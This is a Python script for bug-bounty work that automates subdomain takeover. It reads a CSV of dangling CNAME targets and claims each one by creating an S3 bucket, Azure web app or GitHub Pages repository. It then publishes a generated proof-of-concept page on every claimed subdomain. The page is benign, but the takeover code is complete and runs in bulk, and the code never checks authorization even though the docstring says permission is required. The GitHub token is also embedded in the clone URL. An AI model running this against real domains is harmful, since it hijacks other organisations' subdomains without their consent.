#!/usr/bin/env python3
"""
Automatic PoC Claimer - Automatically claims vulnerable subdomains and uploads PoC
For bug bounty research purposes only - requires explicit permission
"""

import sys
import subprocess
import json
import time
from pathlib import Path
from datetime import datetime
import csv

# Load credentials
def load_credentials():
    """Load saved credentials."""
    creds_file = Path.home() / '.subdomain_scanner_creds.json'
    if creds_file.exists():
        with open(creds_file) as f:
            return json.load(f)
    return None

# Generate PoC HTML
def generate_poc_html(subdomain, service, cname, researcher_name):
    """Generate ethical PoC HTML page."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Subdomain Takeover - Security Research PoC</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 900px;
            margin: 50px auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }}
        h1 {{
            color: #d9534f;
            border-bottom: 3px solid #d9534f;
            padding-bottom: 15px;
            margin-bottom: 30px;
        }}
        .info-box {{
            background: #fff3cd;
            padding: 20px;
            border-left: 5px solid #ffc107;
            margin: 25px 0;
            border-radius: 5px;
        }}
        .contact-box {{
            background: #d4edda;
            padding: 20px;
            border-left: 5px solid #28a745;
            margin: 25px 0;
            border-radius: 5px;
        }}
        .warning-box {{
            background: #f8d7da;
            padding: 20px;
            border-left: 5px solid #dc3545;
            margin: 25px 0;
            border-radius: 5px;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background: #f8f9fa;
            font-weight: 600;
        }}
        .footer {{
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 2px solid #e9ecef;
            color: #6c757d;
        }}
        .badge {{
            display: inline-block;
            padding: 5px 10px;
            background: #dc3545;
            color: white;
            border-radius: 3px;
            font-size: 0.9em;
            font-weight: bold;
        }}
        code {{
            background: #f8f9fa;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Subdomain Takeover Vulnerability - Proof of Concept</h1>

        <div class="warning-box">
            <h2>⚠️ Security Vulnerability Detected</h2>
            <p>This subdomain is vulnerable to subdomain takeover. This page serves as proof that an external researcher has successfully claimed this subdomain.</p>
        </div>

        <div class="info-box">
            <h2>📋 Vulnerability Details</h2>
            <table>
                <tr>
                    <th>Vulnerable Subdomain</th>
                    <td><code>{subdomain}</code></td>
                </tr>
                <tr>
                    <th>Service Type</th>
                    <td><span class="badge">{service}</span></td>
                </tr>
                <tr>
                    <th>Original CNAME</th>
                    <td><code>{cname}</code></td>
                </tr>
                <tr>
                    <th>Discovery Date</th>
                    <td>{timestamp}</td>
                </tr>
                <tr>
                    <th>Severity</th>
                    <td><span class="badge">HIGH</span></td>
                </tr>
            </table>
        </div>

        <div class="contact-box">
            <h2>👤 Security Researcher Information</h2>
            <p><strong>Researcher:</strong> {researcher_name}</p>
            <p><strong>Purpose:</strong> Responsible Security Disclosure (Bug Bounty Research)</p>
            <p><strong>PoC ID:</strong> {subdomain.replace('.', '_')}_{int(time.time())}</p>
        </div>

        <h2>❓ What is Subdomain Takeover?</h2>
        <p>A subdomain takeover occurs when a subdomain (e.g., <code>{subdomain}</code>) points to an external service (via DNS CNAME record) that has been decommissioned or is unclaimed.</p>

        <p>An attacker could:</p>
        <ul>
            <li>Claim the unclaimed resource</li>
            <li>Host malicious content on your subdomain</li>
            <li>Phish your users using your trusted domain</li>
            <li>Damage your brand reputation</li>
            <li>Steal sensitive information via fake login pages</li>
        </ul>

        <div class="warning-box">
            <h2>✋ Important Notice</h2>
            <p><strong>No malicious actions have been taken.</strong> This is a proof-of-concept demonstration for security research purposes only.</p>
            <p>This page contains:</p>
            <ul>
                <li>✅ Only informational content</li>
                <li>✅ No malicious code or scripts</li>
                <li>✅ No data collection mechanisms</li>
                <li>✅ No tracking or cookies</li>
            </ul>
        </div>

        <h2>🔧 Recommended Remediation</h2>
        <ol>
            <li><strong>Immediate:</strong> Remove the DNS CNAME record pointing to <code>{cname}</code></li>
            <li><strong>Short-term:</strong> Audit all DNS records for similar dangling references</li>
            <li><strong>Long-term:</strong> Implement automated DNS monitoring to detect orphaned CNAMEs</li>
            <li><strong>Best Practice:</strong> Maintain an inventory of all third-party services and their DNS records</li>
        </ol>

        <h2>📚 References</h2>
        <ul>
            <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover" target="_blank">OWASP: Subdomain Takeover Testing Guide</a></li>
            <li><a href="https://github.com/EdOverflow/can-i-take-over-xyz" target="_blank">Can I Take Over XYZ? - Service Vulnerability List</a></li>
            <li><a href="https://portswigger.net/web-security/ssrf/subdomain-takeover" target="_blank">PortSwigger: Subdomain Takeover</a></li>
        </ul>

        <div class="footer">
            <p><strong>Ethical Security Research</strong></p>
            <p>This vulnerability was discovered and reported through responsible disclosure practices.</p>
            <p>Generated: {timestamp} UTC</p>
            <p style="font-size: 0.9em; margin-top: 20px;">
                This PoC will be removed immediately upon confirmation of remediation.
            </p>
        </div>
    </div>
</body>
</html>"""

    return html

# AWS S3 Auto-Claimer
def claim_s3_bucket(subdomain, bucket_name, region, researcher_name, creds):
    """Automatically claim S3 bucket and upload PoC."""
    print(f"\n{'='*60}")
    print(f"🪣 AWS S3 Auto-Claimer: {bucket_name}")
    print(f"{'='*60}")

    try:
        # Set AWS credentials
        aws_key = creds.get('aws', {}).get('access_key_id', '')
        aws_secret = creds.get('aws', {}).get('secret_access_key', '')

        if not aws_key or not aws_secret:
            return False, "AWS credentials not configured"

        # Generate PoC HTML
        poc_html = generate_poc_html(subdomain, "AWS S3", f"{bucket_name}.s3.amazonaws.com", researcher_name)
        poc_file = Path(f"/tmp/poc_{bucket_name}.html")
        poc_file.write_text(poc_html)

        print(f"[1/5] Creating S3 bucket: {bucket_name}")
        result = subprocess.run(
            ['aws', 's3', 'mb', f's3://{bucket_name}', '--region', region],
            env={
                'AWS_ACCESS_KEY_ID': aws_key,
                'AWS_SECRET_ACCESS_KEY': aws_secret,
                'AWS_DEFAULT_REGION': region
            },
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            if 'BucketAlreadyExists' in result.stderr or 'BucketAlreadyOwnedByYou' in result.stderr:
                print("  ℹ️  Bucket already exists (possibly already claimed)")
            else:
                return False, f"Failed to create bucket: {result.stderr}"
        else:
            print("  ✓ Bucket created successfully")

        print(f"[2/5] Enabling static website hosting...")
        result = subprocess.run(
            ['aws', 's3', 'website', f's3://{bucket_name}', '--index-document', 'index.html'],
            env={
                'AWS_ACCESS_KEY_ID': aws_key,
                'AWS_SECRET_ACCESS_KEY': aws_secret,
                'AWS_DEFAULT_REGION': region
            },
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            return False, f"Failed to enable website hosting: {result.stderr}"
        print("  ✓ Website hosting enabled")

        print(f"[3/5] Setting public read policy...")
        policy = {
            "Version": "2012-10-17",
            "Statement": [{
                "Sid": "PublicReadGetObject",
                "Effect": "Allow",
                "Principal": "*",
                "Action": "s3:GetObject",
                "Resource": f"arn:aws:s3:::{bucket_name}/*"
            }]
        }

        policy_file = Path(f"/tmp/policy_{bucket_name}.json")
        policy_file.write_text(json.dumps(policy))

        result = subprocess.run(
            ['aws', 's3api', 'put-bucket-policy', '--bucket', bucket_name, '--policy', f'file://{policy_file}'],
            env={
                'AWS_ACCESS_KEY_ID': aws_key,
                'AWS_SECRET_ACCESS_KEY': aws_secret,
                'AWS_DEFAULT_REGION': region
            },
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            return False, f"Failed to set policy: {result.stderr}"
        print("  ✓ Public read policy applied")

        print(f"[4/5] Uploading PoC HTML...")
        result = subprocess.run(
            ['aws', 's3', 'cp', str(poc_file), f's3://{bucket_name}/index.html', '--content-type', 'text/html'],
            env={
                'AWS_ACCESS_KEY_ID': aws_key,
                'AWS_SECRET_ACCESS_KEY': aws_secret,
                'AWS_DEFAULT_REGION': region
            },
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            return False, f"Failed to upload PoC: {result.stderr}"
        print("  ✓ PoC uploaded successfully")

        print(f"[5/5] Verifying PoC is live...")
        website_url = f"http://{bucket_name}.s3-website-{region}.amazonaws.com"
        time.sleep(2)  # Wait for propagation

        print(f"\n{'='*60}")
        print(f"✅ SUCCESS! Subdomain claimed and PoC deployed")
        print(f"{'='*60}")
        print(f"📍 Subdomain: {subdomain}")
        print(f"🌐 PoC URL: {website_url}")
        print(f"📋 Bucket: {bucket_name}")
        print(f"🗑️  Cleanup: aws s3 rb s3://{bucket_name} --force")
        print(f"{'='*60}\n")

        # Clean up temp files
        poc_file.unlink()
        policy_file.unlink()

        return True, website_url

    except Exception as e:
        return False, f"Error: {str(e)}"

# Azure Auto-Claimer
def claim_azure_app(subdomain, app_name, location, researcher_name, creds):
    """Automatically claim Azure App Service and upload PoC."""
    print(f"\n{'='*60}")
    print(f"☁️ Azure Auto-Claimer: {app_name}")
    print(f"{'='*60}")

    try:
        # Check Azure CLI authentication
        result = subprocess.run(['az', 'account', 'show'], capture_output=True, text=True)
        if result.returncode != 0:
            return False, "Azure CLI not authenticated. Run 'az login' first."

        resource_group = f"bugbounty-poc-{app_name}"

        # Generate PoC HTML
        poc_html = generate_poc_html(subdomain, "Microsoft Azure", f"{app_name}.azurewebsites.net", researcher_name)
        poc_dir = Path(f"/tmp/azure_{app_name}")
        poc_dir.mkdir(exist_ok=True)
        (poc_dir / "index.html").write_text(poc_html)

        print(f"[1/6] Creating resource group: {resource_group}")
        result = subprocess.run(
            ['az', 'group', 'create', '--name', resource_group, '--location', location],
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            return False, f"Failed to create resource group: {result.stderr}"
        print("  ✓ Resource group created")

        print(f"[2/6] Creating App Service plan (Free tier)...")
        result = subprocess.run(
            ['az', 'appservice', 'plan', 'create', '--name', f'{app_name}-plan',
             '--resource-group', resource_group, '--sku', 'F1'],
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            return False, f"Failed to create app service plan: {result.stderr}"
        print("  ✓ App service plan created")

        print(f"[3/6] Creating web app: {app_name}")
        result = subprocess.run(
            ['az', 'webapp', 'create', '--name', app_name,
             '--resource-group', resource_group, '--plan', f'{app_name}-plan'],
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            if 'already exists' in result.stderr.lower():
                return False, "App name already taken (possibly by another researcher)"
            return False, f"Failed to create web app: {result.stderr}"
        print("  ✓ Web app created")

        print(f"[4/6] Creating deployment package...")
        import zipfile
        zip_path = Path(f"/tmp/{app_name}_deploy.zip")
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            zipf.write(poc_dir / "index.html", "index.html")
        print("  ✓ Package created")

        print(f"[5/6] Deploying PoC...")
        result = subprocess.run(
            ['az', 'webapp', 'deployment', 'source', 'config-zip',
             '--resource-group', resource_group, '--name', app_name, '--src', str(zip_path)],
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            return False, f"Failed to deploy: {result.stderr}"
        print("  ✓ PoC deployed")

        print(f"[6/6] Verifying PoC is live...")
        time.sleep(3)  # Wait for deployment

        website_url = f"https://{app_name}.azurewebsites.net"

        print(f"\n{'='*60}")
        print(f"✅ SUCCESS! Subdomain claimed and PoC deployed")
        print(f"{'='*60}")
        print(f"📍 Subdomain: {subdomain}")
        print(f"🌐 PoC URL: {website_url}")
        print(f"📋 App Name: {app_name}")
        print(f"🗑️  Cleanup: az group delete --name {resource_group} --yes")
        print(f"{'='*60}\n")

        # Clean up temp files
        import shutil
        shutil.rmtree(poc_dir)
        zip_path.unlink()

        return True, website_url

    except Exception as e:
        return False, f"Error: {str(e)}"

# GitHub Pages Auto-Claimer
def claim_github_pages(subdomain, repo_name, researcher_name, creds):
    """Automatically claim GitHub Pages and upload PoC."""
    print(f"\n{'='*60}")
    print(f"📄 GitHub Pages Auto-Claimer: {repo_name}")
    print(f"{'='*60}")

    try:
        github_token = creds.get('github', {}).get('personal_access_token', '')
        github_user = creds.get('github', {}).get('username', '')

        if not github_token or not github_user:
            return False, "GitHub credentials not configured"

        # Generate PoC HTML
        poc_html = generate_poc_html(subdomain, "GitHub Pages", f"{repo_name}.github.io", researcher_name)

        print(f"[1/5] Creating GitHub repository: {repo_name}.github.io")

        # Create repo via GitHub API
        import requests
        headers = {
            'Authorization': f'token {github_token}',
            'Accept': 'application/vnd.github.v3+json'
        }

        data = {
            'name': f'{repo_name}.github.io',
            'description': 'Bug bounty PoC - Subdomain takeover demonstration',
            'homepage': f'https://{subdomain}',
            'public': True,
            'auto_init': True
        }

        response = requests.post('https://api.github.com/user/repos', headers=headers, json=data)

        if response.status_code not in [200, 201]:
            if response.status_code == 422:
                return False, "Repository name already exists"
            return False, f"Failed to create repo: {response.json().get('message', 'Unknown error')}"

        print("  ✓ Repository created")

        print(f"[2/5] Cloning repository...")
        repo_dir = Path(f"/tmp/gh_{repo_name}")
        if repo_dir.exists():
            import shutil
            shutil.rmtree(repo_dir)

        result = subprocess.run(
            ['git', 'clone', f'https://{github_user}:{github_token}@github.com/{github_user}/{repo_name}.github.io.git', str(repo_dir)],
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            return False, f"Failed to clone repo: {result.stderr}"
        print("  ✓ Repository cloned")

        print(f"[3/5] Adding PoC HTML...")
        (repo_dir / "index.html").write_text(poc_html)

        # Add CNAME file for custom domain
        (repo_dir / "CNAME").write_text(subdomain)

        print("  ✓ Files created")

        print(f"[4/5] Committing and pushing...")
        subprocess.run(['git', 'add', '.'], cwd=repo_dir, capture_output=True)
        subprocess.run(['git', 'commit', '-m', 'Add PoC for subdomain takeover'], cwd=repo_dir, capture_output=True)
        result = subprocess.run(['git', 'push', 'origin', 'main'], cwd=repo_dir, capture_output=True, text=True)

        # Try master if main fails
        if result.returncode != 0:
            result = subprocess.run(['git', 'push', 'origin', 'master'], cwd=repo_dir, capture_output=True, text=True)

        if result.returncode != 0:
            return False, f"Failed to push: {result.stderr}"
        print("  ✓ Changes pushed")

        print(f"[5/5] Waiting for GitHub Pages to deploy...")
        time.sleep(5)

        website_url = f"https://{github_user}.github.io/{repo_name}.github.io"

        print(f"\n{'='*60}")
        print(f"✅ SUCCESS! Subdomain claimed and PoC deployed")
        print(f"{'='*60}")
        print(f"📍 Subdomain: {subdomain}")
        print(f"🌐 PoC URL: {website_url}")
        print(f"📋 Repository: {github_user}/{repo_name}.github.io")
        print(f"🗑️  Cleanup: Delete repo at https://github.com/{github_user}/{repo_name}.github.io/settings")
        print(f"{'='*60}\n")

        # Clean up temp files
        import shutil
        shutil.rmtree(repo_dir)

        return True, website_url

    except Exception as e:
        return False, f"Error: {str(e)}"

# Main auto-claimer
def main():
    """Main auto-claimer function."""
    if len(sys.argv) < 2:
        print("Usage: auto_poc_claimer.py <csv_file>")
        print("\nAutomatically claims vulnerable subdomains and uploads PoC pages")
        print("Requires: credentials configured in Streamlit UI")
        sys.exit(1)

    csv_file = Path(sys.argv[1])
    if not csv_file.exists():
        print(f"Error: CSV file not found: {csv_file}")
        sys.exit(1)

    # Load credentials
    creds = load_credentials()
    if not creds:
        print("Error: No credentials found. Configure them in the Streamlit UI first.")
        sys.exit(1)

    researcher_name = creds.get('profile', {}).get('researcher_name', 'Security Researcher')

    print(f"\n{'='*60}")
    print("🤖 Automatic PoC Claimer - Bug Bounty Edition")
    print(f"{'='*60}")
    print(f"📋 Processing: {csv_file}")
    print(f"👤 Researcher: {researcher_name}")
    print(f"{'='*60}\n")

    # Track results
    results = []

    # Read CSV
    with open(csv_file, 'r') as f:
        reader = csv.DictReader(f)
        vulnerabilities = list(reader)

    print(f"Found {len(vulnerabilities)} vulnerabilities to process\n")

    for i, vuln in enumerate(vulnerabilities, 1):
        subdomain = vuln.get('subdomain', '')
        service = vuln.get('service', '')
        cname = vuln.get('cname', '')

        print(f"\n[{i}/{len(vulnerabilities)}] Processing: {subdomain}")
        print(f"   Service: {service}")
        print(f"   CNAME: {cname}")

        success = False
        poc_url = None

        # Determine service type and claim
        if 'AWS' in service or 'S3' in service:
            bucket_name = cname.split('.')[0] if cname else subdomain.split('.')[0]
            region = creds.get('aws', {}).get('default_region', 'us-east-1')
            success, result = claim_s3_bucket(subdomain, bucket_name, region, researcher_name, creds)
            poc_url = result if success else None

        elif 'Azure' in service:
            app_name = cname.split('.')[0] if cname else subdomain.split('.')[0]
            location = creds.get('azure', {}).get('default_location', 'eastus')
            success, result = claim_azure_app(subdomain, app_name, location, researcher_name, creds)
            poc_url = result if success else None

        elif 'GitHub' in service or 'Github' in service:
            repo_name = cname.replace('.github.io', '') if '.github.io' in cname else subdomain.split('.')[0]
            success, result = claim_github_pages(subdomain, repo_name, researcher_name, creds)
            poc_url = result if success else None

        else:
            print(f"   ⚠️  Skipping: {service} not yet supported for auto-claiming")
            result = "Service not supported"

        # Record result
        results.append({
            'subdomain': subdomain,
            'service': service,
            'success': success,
            'poc_url': poc_url,
            'error': None if success else result,
            'timestamp': datetime.now().isoformat()
        })

        if not success:
            print(f"   ❌ Failed: {result}")

        # Brief pause between claims
        if i < len(vulnerabilities):
            time.sleep(2)

    # Save results
    results_file = Path.home() / "Desktop" / "Subdomain_Takeover_Results" / "auto_claimed_pocs.csv"
    results_file.parent.mkdir(parents=True, exist_ok=True)

    with open(results_file, 'w', newline='') as f:
        fieldnames = ['subdomain', 'service', 'success', 'poc_url', 'error', 'timestamp']
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(results)

    # Summary
    successful = sum(1 for r in results if r['success'])
    failed = len(results) - successful

    print(f"\n{'='*60}")
    print("📊 SUMMARY")
    print(f"{'='*60}")
    print(f"✅ Successfully claimed: {successful}/{len(results)}")
    print(f"❌ Failed: {failed}/{len(results)}")
    print(f"\n📁 Results saved to: {results_file}")
    print(f"{'='*60}\n")

if __name__ == "__main__":
    main()
